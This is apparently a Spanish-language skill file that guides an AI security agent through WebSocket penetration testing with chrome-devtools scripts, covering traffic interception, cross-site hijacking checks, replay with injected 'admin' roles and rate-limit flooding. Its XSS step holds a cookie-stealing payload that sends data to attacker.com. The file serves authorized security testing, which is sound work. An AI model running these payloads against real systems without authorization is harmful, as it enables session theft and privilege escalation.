# Skill: WebSocket Security Analysis

**Categoría:** web, api, protocol
**Metodología base:** OWASP WSTG-CLIENT, WSTG-SESS, WebSocket Security Cheat Sheet
**Cuándo activar:** cuando la aplicación usa WebSocket (wss://) para comunicación bidireccional, especialmente en features de chat, notifications, real-time data, o gaming
**MCP requerido:** `chrome-devtools`

---

## Arquitectura del Skill

WebSocket presenta vectores únicos que HTTP no tiene: comunicación bidireccional simultánea, estado persistente en el canal, y mensajes que pueden ser initiados por el servidor sin.request del cliente. Esto abre superficies para:

- Cross-Site WebSocket Hijacking (CSWSH)
- WebSocket injection (XSS via WebSocket)
- Authentication/Authorization bypass en mensajes
- Mass assignment en mensajes JSON
- Denial of Service via ping/pong flooding
- Cache Poisoning via WebSocket

---

## Fase 0 — Detección de WebSocket Usage

### 0.1 Listar Páginas y Detectar WebSocket

```javascript
chrome-devtools_list_pages()

chrome-devtools_list_network_requests({
  resourceTypes: ["websocket"]
})
```

### 0.2 Dump de WebSocket Globals

```javascript
chrome-devtools_evaluate_script({
  function: `() => {
    // Detectar si hay objetos WebSocket activos
    const activeWS = [];

    // Buscar en window
    for (const key of Object.keys(window)) {
      try {
        const val = window[key];
        if (val instanceof WebSocket) {
          activeWS.push({
            url: val.url,
            readyState: val.readyState,
            protocol: val.protocol
          });
        }
      } catch (e) {}
    }

    // Detectar WebSocket constructor interception (si alguien lo hookeo)
    const origWS = window.WebSocket;
    const wsInstances = [];
    window.WebSocket = function(url, protocols) {
      const ws = protocols ? new origWS(url, protocols) : new origWS(url);
      wsInstances.push({ url, protocols, instance: ws });
      return ws;
    };
    window.WebSocket.prototype = origWS.prototype;
    window.WebSocket.CONNECTING = origWS.CONNECTING;
    window.WebSocket.OPEN = origWS.OPEN;
    window.WebSocket.CLOSING = origWS.CLOSING;
    window.WebSocket.CLOSED = origWS.CLOSED;

    return JSON.stringify({
      activeWebSockets: activeWS,
      interceptedConstructorCount: wsInstances.length,
      note: 'WebSocket interceptor instalado'
    }, null, 2);
  }`
})
```

---

## Fase 1 — Captura de Tráfico WebSocket

### 1.1 Interceptor de Mensajes WebSocket

```javascript
// Instalar interceptor bidireccional
chrome-devtools_evaluate_script({
  function: `() => {
    if (window.__wsInterceptor) return 'Ya instalado';

    const origSend = WebSocket.prototype.send;
    const origClose = WebSocket.prototype.close;

    window.__wsInterceptor = {
      messages: [],  // { direction: 'send'|'recv', data, timestamp, size }
      connections: [],
      originalSend: origSend,
      originalClose: origClose
    };

    // Interceptar envío de mensajes
    WebSocket.prototype.send = function(data) {
      window.__wsInterceptor.messages.push({
        direction: 'send',
        url: this.url,
        data: typeof data === 'string' ? data : '[binary/blob]',
        timestamp: Date.now(),
        size: typeof data === 'string' ? data.length : 0
      });
      return origSend.call(this, data);
    };

    // Interceptar cierre
    WebSocket.prototype.close = function(code, reason) {
      window.__wsInterceptor.messages.push({
        direction: 'close',
        url: this.url,
        code,
        reason,
        timestamp: Date.now()
      });
      return origClose.call(this, code, reason);
    };

    return 'WebSocket interceptor instalado';
  }`
})
```

### 1.2 dump de Mensajes Acumulados

```javascript
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    return JSON.stringify({
      total: msgs.length,
      by_direction: {
        send: msgs.filter(m => m.direction === 'send').length,
        recv: msgs.filter(m => m.direction === 'recv').length,
        close: msgs.filter(m => m.direction === 'close').length
      },
      messages: msgs.slice(-50)  // últimos 50
    }, null, 2);
  }`
})
```

### 1.3 Capturar Mensaje Específico

```javascript
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    const lastMsg = msgs.filter(m => m.direction === 'recv').slice(-1)[0];
    return lastMsg ? JSON.stringify(lastMsg, null, 2) : 'No messages';
  }`
})
```

---

## Fase 2 — Análisis de Vulnerabilidades

### 2.1 Cross-Site WebSocket Hijacking (CSWSH)

Verificar si el servidor valida el Origin header en conexiones WebSocket:

```javascript
// Crear WebSocket desde contexto cross-origin y ver si conecta
chrome-devtools_evaluate_script({
  function: `() => {
    return new Promise((resolve) => {
      const ws = new WebSocket('wss://target/ws', 'protocol');

      ws.onopen = () => {
        resolve({
          status: 'CONNECTED',
          note: 'WebSocket accepted without Origin validation - VULNERABLE to CSWSH',
          url: ws.url,
          protocol: ws.protocol
        });
        ws.close();
      };

      ws.onerror = () => {
        resolve({
          status: 'ERROR',
          note: 'Connection rejected - may have Origin validation'
        });
      };

      setTimeout(() => resolve({ status: 'TIMEOUT' }), 5000);
    });
  }`
})
```

### 2.2 WebSocket Injection (XSS via WebSocket)

Verificar si mensajes del servidor se renderizan sin sanitización en el DOM:

```javascript
// Enviar mensaje malicioso y observar si se inyecta
chrome-devtools_evaluate_script({
  function: `() => {
    // Encontrar el último WebSocket abierto
    const msgs = window.__wsInterceptor?.messages || [];
    const wsUrl = msgs[msgs.length - 1]?.url;

    if (!wsUrl) return 'No WebSocket URL found';

    // Inyectar payload XSS simulando mensaje del servidor
    // (esto requiere que el servidor reenvíe el mensaje sin sanitizar)
    const payload = '<img src=x onerror=fetch(\"https://attacker.com/?xss=\"+document.cookie)>';

    // Enviar al servidor (si hay handlers que lo procesan)
    // El análisis real se hace observando si el DOM se modifica

    return {
      payload_sent: payload,
      note: 'Observar si el DOM se modifica con el payload. Verificar con chrome-devtools_take_snapshot()'
    };
  }`
})
```

### 2.3 Authorization Check en Cada Mensaje

Verificar si el servidor valida auth en cada mensaje WebSocket o solo al conectar:

```javascript
// Capturar un mensaje autenticado y reenviar sin cookies
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    const authMsgs = msgs.filter(m =>
      m.direction === 'send' &&
      (m.data?.includes('token') || m.data?.includes('auth') || m.data?.includes('session'))
    );

    if (authMsgs.length === 0) return 'No auth messages found';

    const lastAuth = authMsgs[authMsgs.length - 1];

    // Simular reenvío sin credenciales (el test real requiere otro WS)
    return {
      original_message: lastAuth.data,
      original_url: lastAuth.url,
      test_approach: 'Crear nuevo WebSocket sin cookies y reenviar mensaje para verificar auth en mensaje',
      vulnerable_if: 'El servidor acepta el mensaje sin re-validar session'
    };
  }`
})
```

### 2.4 Mass Assignment en Mensajes JSON

```javascript
// Analizar estructura de mensajes para detectar campos modicibles
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    const jsonMsgs = msgs
      .filter(m => m.direction === 'send')
      .map(m => {
        try {
          return { data: JSON.parse(m.data), url: m.url, timestamp: m.timestamp };
        } catch {
          return null;
        }
      })
      .filter(Boolean);

    if (jsonMsgs.length === 0) return 'No JSON messages found';

    // Detectar campos suspects para mass assignment
    const suspiciousFields = ['role', 'admin', 'is_verified', 'user_id', 'id', 'balance', 'credit', 'permission', 'access'];

    const findings = jsonMsgs.map(msg => {
      const fields = Object.keys(msg.data);
      const suspicious = fields.filter(f => suspiciousFields.includes(f.toLowerCase()));
      return {
        url: msg.url,
        fields,
        suspicious_fields: suspicious,
        has_nested: typeof msg.data === 'object'
      };
    });

    return JSON.stringify(findings, null, 2);
  }`
})
```

### 2.5 DoS via Ping/Pong Flooding

```javascript
// Medir overhead de ping/pong
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    const pongs = msgs.filter(m =>
      m.direction === 'recv' &&
      (m.data === 'pong' || m.data?.type === 'pong' || m.data?.includes('ping'))
    );

    const pings = msgs.filter(m =>
      m.direction === 'send' &&
      (m.data === 'ping' || m.data?.type === 'ping')
    );

    return {
      ping_sent: pings.length,
      pong_received: pongs.length,
      overhead: pongs.length > 0 ? (pings.length / pongs.length).toFixed(2) : 'N/A',
      vulnerable: pongs.length === 0 && pings.length > 0 ? 'POSSIBLE - server not responding to pings' : 'OK'
    };
  }`
})
```

---

## Fase 3 — Replay y Manipulation

### 3.1 Reenviar Mensaje Modificado

```javascript
// Capturar último mensaje y reenviar con modificación
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    const lastSend = msgs.filter(m => m.direction === 'send').slice(-1)[0];

    if (!lastSend) return 'No messages to replay';

    // Crear nuevo WebSocket
    const ws = new WebSocket(lastSend.url);

    return new Promise((resolve) => {
      ws.onopen = () => {
        // Modificar el mensaje original
        try {
          const parsed = JSON.parse(lastSend.data);
          // Agregar campo privilegiado
          parsed.role = 'admin';
          parsed.is_verified = true;
          ws.send(JSON.stringify(parsed));

          ws.onmessage = (event) => {
            resolve({
              original: lastSend.data,
              modified: JSON.stringify(parsed),
              response: event.data,
              vulnerable: event.data.includes('admin') || event.data.includes('success')
            });
            ws.close();
          };

          setTimeout(() => {
            resolve({ error: 'timeout waiting for response' });
            ws.close();
          }, 5000);
        } catch (e) {
          resolve({ error: e.message });
          ws.close();
        }
      };

      ws.onerror = () => resolve({ error: 'connection failed' });
    });
  }`
})
```

### 3.2 Bypass de Rate Limiting via WebSocket

```javascript
// Enviar mensajes rápidos para probar rate limiting
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    const lastUrl = msgs[msgs.length - 1]?.url;

    if (!lastUrl) return 'No WebSocket URL';

    const testPayload = JSON.stringify({ type: 'message', content: 'rate_test' });

    // Enviar 20 mensajes rápidos
    const promises = Array(20).fill().map((_, i) =>
      new Promise((resolve) => {
        const ws = new WebSocket(lastUrl);
        ws.onopen = () => {
          ws.send(testPayload + '_' + i);
          setTimeout(() => {
            resolve(i);
            ws.close();
          }, 50);
        };
        ws.onerror = () => resolve('error');
      })
    );

    return Promise.all(promises).then(results => ({
      messages_sent: results.length,
      results,
      note: 'Observar si algún mensaje fue rate-limited o rechazado'
    }));
  }`
})
```

---

## Fase 4 — Análisis de Protocolo

### 4.1 Detectar Subprotocols

```javascript
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    const wsInst = msgs[msgs.length - 1]?.url;

    if (!wsInst) return 'No WebSocket found';

    const ws = new WebSocket(wsInst, 'json');  // Probar subprotocol
    return new Promise((resolve) => {
      ws.onopen = () => {
        resolve({
          protocol: ws.protocol,
          url: ws.url,
          supported_protocols: ['json', 'graphql-ws', 'socket.io']
        });
        ws.close();
      };
      ws.onerror = () => resolve({ error: 'connection failed' });
    });
  }`
})
```

### 4.2 Analizar Estructura de Mensajes

```javascript
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];

    const send = msgs.filter(m => m.direction === 'send');
    const recv = msgs.filter(m => m.direction === 'recv');

    const analyze = (arr) => arr.map(m => {
      try {
        const parsed = JSON.parse(m.data);
        return {
          type: typeof parsed,
          keys: Object.keys(parsed),
          has_type_field: 'type' in parsed,
          action: parsed.type || parsed.action || parsed.event || 'unknown'
        };
      } catch {
        return { raw: true, sample: m.data?.substring?.(0, 100) };
      }
    });

    return JSON.stringify({
      sent: analyze(send),
      received: analyze(recv)
    }, null, 2);
  }`
})
```

---

## Fase 5 — Evidencia

### 5.1 Exportar Tráfico WebSocket Completo

```javascript
chrome-devtools_evaluate_script({
  function: `() => {
    const msgs = window.__wsInterceptor?.messages || [];
    return JSON.stringify({
      total_messages: msgs.length,
      capture_time: msgs[0]?.timestamp ? new Date(msgs[0].timestamp).toISOString() : 'unknown',
      endpoint: [...new Set(msgs.filter(m => m.url).map(m => m.url))],
      messages: msgs
    }, null, 2);
  }`
})
```

---

## Checklist de Cierre

```
[ ] WebSocket interceptor instalado
[ ] Tráfico capturado bidireccional
[ ] CSWSH test: Origin validation check
[ ] Authorization test: per-message vs connection-only
[ ] Mass assignment fields identified
[ ] DoS: ping/pong overhead measured
[ ] Rate limiting bypass tested
[ ] Messages exported with evidence
```

---

## Integración con Team

- **security-scout** → detecta uso de WebSocket en superficie
- **security-web** → usa este skill para análisis de vectores WebSocket
- **security-code** → si se encuentra implementación WS, verificar handshaking y validación
